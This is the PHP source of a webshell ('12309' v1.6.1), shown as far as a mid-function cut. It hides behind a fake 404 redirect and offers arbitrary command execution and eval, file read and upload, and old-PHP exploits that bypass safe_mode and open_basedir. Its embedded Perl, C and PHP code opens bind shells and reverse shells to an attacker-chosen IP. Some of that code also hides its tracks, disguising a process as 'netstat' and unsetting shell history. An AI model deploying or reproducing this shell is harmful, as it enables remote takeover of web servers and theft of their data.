<?php
//th1s 1s ultr4l33t php websh3ll || uz3 1t f0r 3duc4t10n4l purp0zes 0nly :P
if(isset($_GET['pfs'])) {
 findsock();
}
session_start();
if(isset($_GET['l0g1n'])) {
 $_SESSION['l0g1n']=session_id();;
}
if(!isset($_SESSION['l0g1n'])) {
 header("Location: http://".$_SERVER['SERVER_NAME']."/404.html"); //debug: maybe usr HTTP_HOST here?
}
$ver="1.6.1"; 
// --------------------------------------------- globals 
error_reporting(0);
$version=phpversion();
$descriptorspec = array(
 0 => array("pipe", "r"),
 1 => array("pipe", "w"),
 2 => array("pipe", "w")
);
// --------------------------------------------- recursive dir removal by Endeveit
function rmrf($dir)
{
    if ($objs = glob($dir."/*")) {
        foreach($objs as $obj) {
            is_dir($obj) ? rmrf($obj) : unlink($obj);
        }
    }
    rmdir($dir);
}
// --------------------------------------------- checking for enabled funcs
function function_enabled($func) {
 $disabled=explode(",",@ini_get("disable_functions")); 
 if (empty($disabled)) { 
  $disabled=array(); 
 } 
 else {  
  $disabled=array_map('trim',array_map('strtolower',$disabled)); 
 } 
 return (function_exists($func) && is_callable($func) && !in_array($func,$disabled) ); 
}
if (!function_enabled('shell_exec') and !function_enabled('proc_open') and !function_enabled('passthru') and !function_enabled('system') and !function_enabled('exec') and !function_enabled('popen')) {
 $failflag="1";
} else {
 $failflag="0";
}
// -------------------------------------------- php <= 5.2.9 curl bug
function sploent529($path) {
 if (!is_dir('file:')) {
  mkdir('file:');
 }
 $dirz=array();
 $a=array();
 $a=explode('/',$path);
 $c=count($a);
 $dir='file:/';
 $d=substr($dir,0,-1);
 if (!is_dir($d)) {
  mkdir($d); 
 }
 for ($i=0;$i<$c-1;++$i) {
  $dir.=$a[$i].'/';
  $d=substr($dir,0,-1);
  $dirz[]=$d;
  if (!is_dir($d)) {
   mkdir($d); 
  } 
 }
 if (!file_exists($path)) {
  $fp=fopen('file:/'.$path,'w');
  fclose($fp); 
 }
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,'file:file:////'.$path);
 curl_setopt($ch,CURLOPT_HEADER,0);
 if(FALSE==curl_exec($ch)) {
  echo ("    fail :( either there is no such file or exploit failed ");
  curl_close($ch);
  rmrf('file:');
  die();
 } else {
  curl_close($ch);
  rmrf('file:');
  return TRUE;
 }
}
// --------------------------------------------- php 5.1.6 ini_set bug
function sploent516() {
 //safe_mode check
 if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
  ini_restore("safe_mode");
  if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
   ini_set("safe_mode", FALSE);
   ini_set("safe_mode", "Off");
   ini_set("safe_mode", "0");
   if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
    echo "<font color=\"red\">safe mode: ON</font><br>";
   } else {
    echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
   }
  } else {
   echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
  }
 } else {
  echo "<font color=\"green\">safe mode: OFF</font><br>";
 }
 //open_basedir check
 if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL || strtolower(ini_get("open_basedir"))=="none") {
  echo "open_basedir: none<br>";
 } 
 else {
  ini_restore("open_basedir");
  if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL ||  strtolower(ini_get("open_basedir"))=="none") {
   echo "open_basedir: none || hello php-5.1.6 bugs<br>";
  } 
  else {
   ini_set('open_basedir', '/'); //TODO: debug: check on php 5.1.6, maybe we need NULL instead of '/'
   if (ini_get("open_basedir")=="/") {
    echo "open_basedir: / || hello php-5.1.6 bugs<br>";
   } 
   else {
    $basedir=TRUE;
   echo "open_basedir: ".ini_get("open_basedir");
   }
  }
 }
}
// --------------------------------------------- findsock
function findsock() {
 $VERSION = "1.0";
 echo "findsock start<br>  ";
 $c=getcwd()."/findsock ".$_SERVER['REMOTE_ADDR']." ".$_SERVER['REMOTE_PORT']."";
 if (function_enabled('shell_exec')) {
  shell_exec($c);
 } else if(function_enabled('passthru')) {
  passthru($c);
 } else if(function_enabled('system')) {
  system($c);
 } else if(function_enabled('exec')) {
  exec($c);
 } else if(function_enabled('proc_open')) {
  $handle=proc_open($c,$descriptorspec,$pipes);
  while (!feof($pipes[1])) {
   $buffer.=fread($pipes[1],1024);
  }
  @proc_close($handle);
 } else if(function_enabled('popen')) {
  $fp=popen($c,'r');
  @pclose($fp);
 }
 echo "  exiting  ";
 exit();
}
// --------------------------------------------- search for binary
function search($bin,$flag) {
 if ($flag=="1") { 
  $path="";
  return $path;
 } else {
  if (function_enabled('shell_exec')) {
   $path=trim(shell_exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
   $perms=trim(shell_exec('stat -c%a '.$path.' 2>&1 | tail -c2'));
  } else if(function_enabled('exec')) {
   $path=trim(exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
   $perms=trim(exec('stat -c%a '.$path.' 2>&1 | tail -c2'));
  } else if(function_enabled('system')) {
   $path=trim(system('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
   $perms=trim(system('stat -c%a '.$path.' 2>&1 | tail -c2'));
  } //TODO: fix search via passthru
   // else if(function_enabled('passthru')) {
   //$path=trim(passthru('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
   //echo "<br> path = ".$path." <br> "; //debug
   //$perms=trim(passthru('stat -c%a '.$path.' 2>&1 | tail -c2'));
   //}
 }
 if (is_null($path)) {
  return $path;
 } else {
  if ($perms < 5) {
   $path="perm";
   return trim($path);
  } else {
   return trim($path);
  }
 }
}
// --------------------------------------------- print page 
$title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- made by vk/12309 || cheerz to Tidus and Shift on BHT; pekayoba and all bros on NS || exploit.in f0r3v4 -->
<html>
 <head>
  <title>12309 '.$ver.'</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
   input {
    background-color: #202020;
    color: white;
    border: none;
   }
   input[type="submit"] {
    background-color: gray;
    color: white;
   }
   BODY {
    background-color: black;
    color: white; 
   }
  </style>
 </head>
 <body>
  <b><a href="'.$_SERVER['PHP_SELF'].'?p=f">file operations</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=s">execute command</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=b">bind/backconnect</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=e">extras</a></b><br><br>';

// --------------------------------------------- main code 
if (!isset($_GET['p'])) { $_GET['p']="s"; }

//echo $title;

switch ($_GET['p']) {
 case "s":
  if (empty($_POST["wut"])) {
   echo $title;
   sploent516();
   if (ini_get("safe_mode")) {
    $failflag="1";
   }
   $shelltext=("uname -a");
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s">
  <font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" maxlength="500" size="50" value="'.$shelltext.'"> <input type="submit" value="go"> <input type="checkbox" name="down"> download <br><br>';
   if ($failflag=="1") {
    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a <a href=\"?p=e\">perl shell</a> ;) and still there is<br></font>"; } else {
    if (function_enabled('passthru')) {
     echo 'passthru <input name="wut" value="passthru" type="radio" checked><br>';
    } else { echo 'passthru is disabled!<br>';}
    if (function_enabled('system')) {
     echo 'system <input name="wut" value="system" type="radio"><br>';
    } else { echo 'system is disabled!<br>';}
    if (function_enabled('exec')) {
     echo 'exec <input name="wut" value="exec" type="radio"><br>';
    } else { echo 'exec is disabled!<br>';}
    if (function_enabled('shell_exec')) {
     echo 'shell_exec <input name="wut" value="shell_exec" type="radio"><br>';
    } else { echo 'shell_exec is disabled!<br>';}
    if (function_enabled('popen')) {
     echo 'popen <input name="wut" value="popen" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
    } else { echo 'popen is disabled!<br>';}
    if (function_enabled('proc_open')) {
     echo 'proc_open <input name="wut" value="proc_open" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
    } else { echo 'proc_open is disabled!<br>';} 
   }
   // eval almost always enabled, except there is special option in suhosin-patched php 
   echo 'php eval() <input name="wut" value="eval" type="radio"><br>';
   //echo 'SQL <input name="wut" value="sql" type="radio"><br>'; //TODO
   echo '</form>';
    //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
   if (extension_loaded('pcntl')) {
    if (function_enabled('pcntl_fork')) {
     if (function_enabled('pcntl_exec')) {
     echo "<br>pcntl_exec:";
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     } else {
      echo "<br>pcntl_exec is disabled!";
     }
    } else {
     echo "<br>pcntl_fork is disabled!";
    }
   } else {
    echo "<br>no pcntl.so here";
   }
   echo "</body></html>";
  } else {
   if ($_POST["down"] != "on") {
    echo $title;
   }
   $shelltext=stripslashes($_POST["command"]);
   $html='<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="green"> haxor@pwnedbox$ </font>';
   $input='<input name="command" type="text" maxlength="500" size="50" value="'.htmlspecialchars($shelltext, ENT_QUOTES, "UTF-8").'"> 2>&1 <input type="submit" value="Enter"> <input type="checkbox" name="down"> download <input name="wut" type="hidden" value="';
   if ($_POST["down"] != "on") {
   switch ($_POST["wut"]) {
    case "passthru":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'passthru"></form>';
     break;
    case "system":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'system"></form>';
     break;
    case "exec":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'exec"></form>';
     break;
    case "shell_exec":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'shell_exec"></form>';
     break;
    case "popen":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'popen"></form>';
     break;
    case "proc_open":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'proc_open"></form>';
     break;
    case "eval":
     if ( $version <= "5.2.9" ) {
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     echo "$html"; echo 'php -r \''; echo '<input name="command" type="text" maxlength="500" size="50" value="'.htmlspecialchars($shelltext, ENT_QUOTES, "UTF-8").'"> \' <input type="submit" value="Enter">
     <input name="wut" value="eval" type="hidden"></form>';
     break;
    case "pcntl":
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     break;
    case "sql":
     header('Location: '.$_SERVER['PHP_SELF'].'?p=ms');
     break;
   }
   }
  }
  if (!empty($_POST["wut"])) {
   if ($_POST["down"] == "on") {
    header("Content-Type: application/force-download");
    header("Content-Type: application/octet-stream");
    header("Content-Type: application/download");
    header("Accept-Ranges: bytes");
    header('Content-Disposition: attachment; filename="result.txt"');
   }
   if ($_POST["down"] != "on") {
    echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
   }
   switch ($_POST["wut"]) {
    case "passthru":
     passthru(stripslashes($_POST["command"]." 2>&1"));
     break;
    case "system":
     system(stripslashes($_POST["command"]." 2>&1"));
     break;
    case "exec":
     exec(stripslashes($_POST["command"]." 2>&1",$out));
     print_r($out);
     break;
    case "shell_exec":
     $out=shell_exec(stripslashes($_POST["command"]." 2>&1"));
     echo "$out";
     break;
    case "popen":
     $hndl=popen(stripslashes($_POST["command"]." 2>&1", "r"));
     $read=stream_get_contents($hndl);
     echo $read;
     pclose($hndl);
     break;
    case "proc_open":
     $process = proc_open('/bin/sh', $descriptorspec, $pipes);
     if (is_resource($process)) {
      fwrite($pipes[0],stripslashes($_POST["command"]));
      fclose($pipes[0]);
      echo stream_get_contents($pipes[1]);
      fclose($pipes[1]);
      echo stream_get_contents($pipes[2]);
      fclose($pipes[2]);
      @proc_close($process);
     }
     break;
    case "pcntl":
     $shelltext=stripslashes($_POST["command"]);
     switch (pcntl_fork()) {
      case 0:
       pcntl_exec($_POST["inter"],array("-c","".$_POST["command"]." ".$_POST["to"]." ".$_POST["pcfile"]));
       exit(0);
      default:
       break;
     }
     sleep(1);
     $fh=fopen("".$_POST["pcfile"]."","r");
     if (!$fh) { echo "can`t fopen ".$_POST["pcfile"].", seems that we failed :("; }
     else {
      $rezult=fread($fh,filesize($_POST["pcfile"]));
      fclose($fh);
      echo $rezult;
      if ($_POST["delrezult"] == "on") { unlink($_POST["pcfile"]); }
     }
     break;
    case "eval":
     eval(stripslashes($_POST["command"]));
     break;
   }
   if ($_POST["down"] != "on") {
    echo "</textarea>";
   }
  }
 break; 
// --------------------------------------------- shell end; sql
//TODO: sql!
 case "ms":
 echo $title;
 //
 if (!empty($_POST['sq'])) {
  echo "todo";
 }
 break;
// --------------------------------------------- sql end; file operations
 case "f":
  if (empty($_POST["down"])) {
   echo $title;
   echo '<font color="blue">---> read file </font><br>';
   echo "<font color=\"gray\">";
   echo "current dir: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
   sploent516();
   echo "<br>--------------------------------<br></font>";
  }
  if (empty($_POST["filer"])) {
   $ololotext="/home/USER/public_html/DOMAIN/index.php";
   echo "php file_get_contents:<br>";
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
   <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
   //curl
   if ( $version <= "5.2.9" ) {
    echo "<br> curl exploit: <br>";
    if (!extension_loaded('curl')) {
     echo "&nbsp;&nbsp;fail, curl is required<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
     <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
    }
   }
  } else {
   switch ($_POST["filer"]) {
    case "php":
     if ($_POST["down"] == "on") {
      header("Content-Type: application/force-download");
      header("Content-Type: application/octet-stream");
      header("Content-Type: application/download");
      header("Accept-Ranges: bytes");
      header('Content-Disposition: attachment; filename="result.txt"');
     }
     $ololotext=($_POST["filename"]);
     if (empty($_POST["down"])) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if (empty($_POST["down"])) {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
      }
      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?");
      echo $contents;
      if (empty($_POST["down"])) {
       echo "</textarea>";
      }
      die(); 
     }
     break;  
    case "curl":
     if ($_POST["down"] == "on") {
      header("Content-Type: application/force-download");
      header("Content-Type: application/octet-stream");
      header("Content-Type: application/download");
      header("Accept-Ranges: bytes");
      header('Content-Disposition: attachment; filename="result.txt"');
     }
     $ololotext=($_POST["filename"]);
     if (empty($_POST["down"])) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if (empty($_POST["down"])) {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
      }
      sploent529($_POST["filename"]);
     }
    break;
   }
  }
  // curl + file_get_contents end
  // upload
   echo '<br><font color="blue">---> upload file</font><br>';
   if (!ini_get('file_uploads')) {
    echo "file_uploads Off";
   } else {
    echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
    echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
    echo "</font>";
    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="filename" type="file">  <input type="submit" value="upload to" /> <input name="filepath" type="text" maxlength="100" size="20" value="./"> <input name="upload" type="hidden" value="okz">';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
    echo '</form>';
    if (!empty($_POST["upload"])) {
     if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
     {
       if (!move_uploaded_file($_FILES["filename"]["tmp_name"], $_POST['filepath']."".$_FILES["filename"]["name"])) {
        echo "<br>fukken failed<br>";
       } else {
        echo "<br>upload done</br>";
       }
     } else {
        echo("<br>fukken failed<br>");
     }
    }
   }
   echo "<br>";
   echo '<font color="blue">---> current dir</font><br>';
   echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
   foreach (glob("{,.}*", GLOB_BRACE) as $filename) {
    echo "".$filename." -> size ".filesize($filename)." -> chmod ".substr(sprintf('%o',fileperms($filename)), -4)."\n";
   }
   echo "</textarea><br>";
  break;
// --------------------------------------------- file end; bind
 case "b":
  echo $title;
  if ($failflag=="1") {
   echo "fail, at least one system function needed!<br><br>";
  } else {
   $nc='<font color="gray">(dont forget to setup nc <b>first</b>!)</font>';
   $semi='<font color="gray">dont forget to write <b>;</b> at the end of command!</font>';
   echo '<font color="gray">(see result below)</font><br><br>';
   echo '<font color="blue">---> PHP </font><br>';
   if (!function_enabled('set_time_limit')) { echo '<font color="gray">warning! set_time_limit off!</font><br>'; }
   if (!function_enabled('ignore_user_abort')) { echo '<font color="gray">warning! ignore_user_abort off!</font><br>'; }
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$semi.'<input name="shellz" type="hidden" value="phplocal"></form>';
   if (function_enabled('fsockopen')) {
    if (function_enabled('proc_open')) {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$nc.'<input name="shellz" type="hidden" value="phpremote"></form>';
    } else { echo 'fail, proc_open is needed for backconnect!<br><br>'; }
   } else { echo 'fail, fsockopen is needed for backconnect!<br><br>'; }
   //php end
   echo '<font color="blue">---> PERL </font><br>';
   if (@is_null(search("perl",$failflag))) {
    echo "fail, no perl here<br>";
   } else {
     if (@search("perl",$failflag)=="perm") {
     echo "fail, bad permissions<br>";
    } else {
     if (class_exists('Perl')) {
      $perl = new Perl();
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal1"><br>'.$semi.'</form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote1"><br>'.$nc.'</form>';
     } else {
      echo '<font color="gray">class Perl not found! will try to save and execute file...</font><br>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="100" size="10" style="color: green;" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal2"><br>'.$semi.'</form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="100" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote2"><br>'.$nc.'<br>';
      if (ini_get('open_basedir')=='0' || strtolower(ini_get('open_basedir'))=='none') {
       echo '<font color="gray">open_basedir: none</font><br>';
      } else {
       echo '<font color="gray">open_basedir: '.ini_get('open_basedir').'</font><br>';
      }
      echo "</form>";
     }
    }
   }
   //perl end
   echo "<br>";
   echo '<font color="blue">---> C </font><br>';
   if (is_null(search("gcc",$failflag))) {
    echo "fail, no gcc here<br>";
   } else {
     if (search("gcc",$failflag)=="perm") {
      echo "fail, bad permissions<br>";
     } else {
      echo '<font color="gray">compiler= '.search("gcc",$failflag).'</font><br>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><input name="shellz" type="hidden" value="clocal"> <br>'.$semi.'</form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><input name="shellz" type="hidden" value="cremote"><br>'.$nc.'</form>';
    }
   }
   //c end
   echo "<br>";
   echo '<font color="blue">---> PHP+C findsock </font><font color="gray">(will not work on modern php/apache)</font><br>';
   if (is_null(search("gcc",$failflag))) {
    echo "fail, no gcc here<br>";
   } else {
     if (search("gcc",$failflag)=="perm") {
      echo "fail, bad permissions<br>";
     } else {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">save and compile file: <input type="submit" value="go"><input name="shellz" type="hidden" value="findsock"><br></form>';
      echo "first save and compile findsock binary, then connect to this shell via nc: <br><br><font color=\"gray\">h4x0r@localhost$ nc -v ".$_SERVER['SERVER_NAME']." 80 <br> GET ".$_SERVER['SCRIPT_NAME']."?pfs HTTP/1.1 <br> Host:".$_SERVER['SERVER_NAME']."<br><br> sh-3.2$ id <br> uid=80(apache) gid=80(apache) groups=80(apache)</font>";
     }
   }
  } //failcheck end
  if (!empty($_POST["shellz"])) {
   //code by security-teams.net. license unknown, assuming WTFPL
   $perlbdcode='#!'.search("perl",$failflag).'
   use IO::Socket::INET;
   $server = IO::Socket::INET->new(
      LocalPort => '.$_POST["port"].',
      Type      => SOCK_STREAM,
      Reuse     => 1,
      Listen    => SOMAXCONN
     ) or die("Failed!\n");
   while(*CONN = $server->accept())
   {
    if(!fork())
    {
     open STDIN,  "<&CONN";
     open STDOUT, ">&CONN";
     open STDERR, ">&CONN";
     system("/bin/sh");
    }
    close CONN;
   }';
   //code by LorD-C0d3r-NT. license unknown, assuming WTFPL
   $perlbccode='#!'.search("perl",$failflag).'
   use IO::Socket;
   $system = "/bin/sh";
   $host = "'.$_POST["ip"].'";
   $port = "'.$_POST["port"].'";
   use Socket;
   use FileHandle;
   socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die();
   connect(SOCKET, sockaddr_in($port, inet_aton($host))) or die();
   SOCKET->autoflush();
   open(STDIN, ">&SOCKET");
   open(STDOUT,">&SOCKET");
   open(STDERR,">&SOCKET");
   system("unset HISTFILE; unset SAVEHIST; uname -a;echo; ");
   system($system);';
   //perl bccode end
   //author/license unknown, assuming WTFPL
   $cbdcode='#include <stdio.h>
   #include <signal.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
   struct sockaddr_in serv_addr; 
   struct sockaddr_in client_addr;
   int main (int argc, char *argv[])
   { 
    int i;
    for(i=0;i<argc;i++) {
     memset(argv[i],\'\x0\',strlen(argv[i]));
    };
    strcpy(argv[0],"netstat");
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if (soc_des == -1) 
     exit(-1); 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons('.$_POST["port"].');
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0) 
     exit(-1); 
    if (fork() != 0) 
     exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
     exit(0); 
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0) 
     exit(0); 
    while (1) { 
     soc_len = sizeof(client_addr);
     soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
     if (soc_cli < 0) 
      exit(0); 
     cli_pid = getpid(); 
     server_pid = fork(); 
     if (server_pid != 0) { 
      dup2(soc_cli,0); 
      dup2(soc_cli,1); 
      dup2(soc_cli,2);
      execl("/bin/sh","sh",(char *)0); 
      close(soc_cli); 
      exit(0); 
     } 
    close(soc_cli);
    }
   }';
   //C bindcode end
   //author/license unknown, assuming WTFPL
   $cbccode='#include <stdio.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    int main(int argc, char *argv[])
    {
     int fd;
     struct sockaddr_in sin;
     daemon(1,0);
     sin.sin_family = AF_INET;
     sin.sin_port = htons(atoi(argv[2]));
     sin.sin_addr.s_addr = inet_addr(argv[1]); 
     bzero(argv[1],strlen(argv[1])+1+strlen(argv[2])); 
     fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ; 
     if ((connect(fd, (struct sockaddr *) &sin, sizeof(struct sockaddr)))<0) {
      perror("[-] connect()");
      exit(0);
     }
     dup2(fd, 0);
     dup2(fd, 1);
     dup2(fd, 2);
     execl("/bin/sh","sh -i", NULL);
     close(fd); 
    }';
   //C bccode end
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
   $findsock='#include <sys/socket.h>
    #include <stdio.h>
    #include <string.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <unistd.h>
    int main (int argc, char** argv) {
     if (argc != 3) {
      printf("Usage: findsock ip port\n");
      exit(0);
     }
    char *sock_ip = argv[1];
    char *sock_port = argv[2];
    struct sockaddr_in rsa;
    struct sockaddr_in lsa;
    int size = sizeof(rsa);
    char remote_ip[30];
    int fd;
    for (fd=3; fd<getdtablesize(); fd++) {
     if (getpeername(fd, &rsa, &size) != -1) {
      strncpy(remote_ip, inet_ntoa(*(struct in_addr *)&rsa.sin_addr.s_addr), 30);
      if (strncmp(remote_ip, sock_ip, 30) == 0) {
       if ((int)ntohs(rsa.sin_port) == (int)atoi(sock_port)) {
        setsid();
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        close(fd);
        execl("/bin/uname", "/bin/uname", "-a", NULL);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
       }
      }
     }
    }
    }';
   //C findsock end
   switch ($_POST["shellz"]) {
    case "phpremote":
    // code by pentestmonkey.net. license: GPLv2
     @set_time_limit(0);
     @ignore_user_abort(1);
     @ini_set('max_execution_time',0);
     $ip=($_POST["ip"]);
     $port=($_POST["port"]);
     $chunk_size=1400;
     $write_a=null;
     $error_a=null;
     $shell='/bin/sh -i';
     $daemon = 0;
     function printit ($string) { if (!$daemon) { print "$string\n"; }}
     if (function_exists('pcntl_fork')) {
      $pid = pcntl_fork();
      if ($pid == -1) { printit("ERROR: Can't fork<br>"); exit(1); }
      if ($pid) { exit(0); }
      if (posix_setsid() == -1) { printit("Error: Can't setsid()<br>"); exit(1); }
      $daemon = 1;
     } else { printit("WARNING: Failed to daemonise!<br>"); }
     umask(0);
     $sock = fsockopen($ip, $port, $errno, $errstr, 30);
